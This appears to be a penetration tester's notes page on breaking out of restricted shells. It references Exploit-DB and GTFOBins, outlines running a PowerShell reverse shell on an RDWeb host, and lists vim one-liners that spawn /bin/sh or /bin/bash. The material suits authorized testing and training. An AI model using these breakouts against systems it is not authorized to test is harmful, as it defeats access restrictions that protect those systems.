Linux - https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
## RDS
If you are stuck running apps through RDWEB but don't have a shell, try this

```
1. Get File Explorer access somehow...
2. Transfer over powershell rev shell.ps1 file
3. Right click and Run with PowerShell
```
## VIM
https://gtfobins.github.io/gtfobins/vim/
See this as reference
```bash
#It can be used to break out from restricted environments by spawning an interactive system shell.

vim -c ':!/bin/sh'

vim --cmd ':set shell=/bin/sh|:shell'

#This requires that vim is compiled with Python support. Prepend :py3 for Python 3.
vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

#This requires that vim is compiled with Lua support.
vim -c ':lua os.execute("reset; exec sh")'
```
If the above do NOT work, try using vim interactively

```bash
vim
	!/bin/bash
	
vim
	:set shell=/bin/sh
	:shell

etc...
```


## SSH
If you have access via ssh but spawn into a restricted shell, check [[22 SSH]]
